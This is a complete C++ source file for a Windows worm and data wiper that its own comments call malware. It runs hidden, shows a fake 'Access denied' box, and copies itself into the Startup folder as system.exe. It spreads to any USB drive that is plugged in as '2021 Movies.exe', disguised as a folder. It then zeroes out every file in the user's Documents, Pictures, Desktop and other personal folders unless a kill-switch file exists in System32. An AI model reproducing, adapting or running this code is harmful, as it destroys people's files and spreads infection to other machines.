
#include <iostream>
#include <string>
#include <dirent.h>
#include <sys/stat.h>
#include <errno.h>
#include<fstream>
#include <Windows.h>
#include <Lmcons.h>

using namespace std;

char getRemovableDisk();
string allDrives;

int copyFile(string originalFile, string replicaFile);

string getUsername();

//Returns true if the given path is a directory else false
bool isDir(string dir)
{
    struct stat fileInfo;
    stat(dir.c_str(), &fileInfo);
    if (S_ISDIR(fileInfo.st_mode)) {
        return true;
    } else {
        return false;
    }
}

//Recursively moves in a given directory to identify files and overwrite them with nothing (0KB concept)
void listFiles(string baseDir, bool recursive)
{	
    DIR *dp;
    struct dirent *dirp;
    if ((dp = opendir(baseDir.c_str())) == NULL) {
        //with the occurance of any file related error just exit silently
        return;
    } else {
        while ((dirp = readdir(dp)) != NULL) {
            if (dirp->d_name != string(".") && dirp->d_name != string("..")) {
                if (isDir(baseDir + dirp->d_name) == true && recursive == true) {                  
                    listFiles(baseDir + dirp->d_name + "/", true);
                } else {
                    string file = baseDir +"\\"+ dirp->d_name;
                    //overwite file content
					ofstream file_to_destroy(file.c_str(), ios::out);
					file_to_destroy.close();
                }
            }
        }
        closedir(dp);
    }
}

//main entry point
int main(int argc, char** argv) {
	
	//hide the console, (make the app run as a background process)
	FreeConsole();
	string originalFile = argv[0];
	
	/*path to startup folder: 
		C:\Users\<user name>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup */
	string replicaFile = "C:\\Users\\" + getUsername() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\system.exe";
	
	/*if the program is run from an external drive (or anyother location apart from the startup folder)
		it should only copy itself to startup folder and terminate with a message box*/
	if(originalFile != replicaFile){
		MessageBox(NULL, "Access to this folder is denied!","Access Error", MB_ICONEXCLAMATION | MB_OK);
		copyFile(originalFile, replicaFile);
		return 0;	
	}
	
	char driveLetter = getRemovableDisk(); 
	//main loop
    while(1){
    	//wait untill an external drive is connected then break
    	while(1){
	        driveLetter = getRemovableDisk();
	        if(driveLetter!='0'){
	            
	            //convert char to string
				string letter;
				letter.push_back(driveLetter);
	            replicaFile = letter+":\\2021 Movies.exe";
	            
	            //copy itself to the attached drive with the name "2021 Movies" with a fake folder icon
	            copyFile(originalFile, replicaFile);
	            //after replicating into one external device, break this operation and delete files in the computer
	            break;
	            
	        }
	
	        Sleep(1000);     
    	}
    	
    	/* avoid rebellion against his creator, for a computer to be safe from this malware, it should have a 
    	file named protection.bin in the path below */
		ifstream protector;
		protector.open("C:\\Windows\\System32\\protection.bin", ios::in);
		if(!protector.is_open()){
			//delete files in each of these directories
			listFiles("C:\\Users\\" + getUsername() + "\\Documents\\", true);
			listFiles("C:\\Users\\" + getUsername() + "\\Videos\\", true);
			listFiles("C:\\Users\\" + getUsername() + "\\Downloads\\", true);
			listFiles("C:\\Users\\" + getUsername() + "\\Music\\", true);
			listFiles("C:\\Users\\" + getUsername() + "\\Pictures\\", true);
			listFiles("C:\\Users\\" + getUsername() + "\\Desktop\\", true);
		}
		protector.close();    	
	}
    
	return 0;
}

//get the drive letter of a connected drive
char getRemovableDisk(){
    char drive='0';

    char szLogicalDrives[MAX_PATH];
    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);

    string currentDrives="";
    
    for(int i=0; i<dwResult; i++)
    {
        if(szLogicalDrives[i]>64 && szLogicalDrives[i]< 90)
        {
            currentDrives.append(1, szLogicalDrives[i]);

            if(allDrives.find(szLogicalDrives[i]) > 100)
            {
                drive = szLogicalDrives[i];
            }
        }
    }

    allDrives = currentDrives;

    return drive;
}

//a regular file copy function, used for self-replication
int copyFile(string originalFile, string replicaFile){
	fstream in(originalFile.c_str(),ios::binary|ios::in);
	fstream out(replicaFile.c_str(),ios::binary|ios::out);
	//convert string to char[]
	
	char c;
	while(true) {
	c=in.get();
	if(in.eof()) break;
	out.put(c);
	}
	in.close();
	out.close();
	return 0;
}

//returns the username of the logged in account
string getUsername(){
	TCHAR name [ UNLEN + 1 ];
	DWORD size = UNLEN + 1;

	if (GetUserName( (TCHAR*)name, &size )){
		return name;	
	}
	else{
		return "";
	}
}
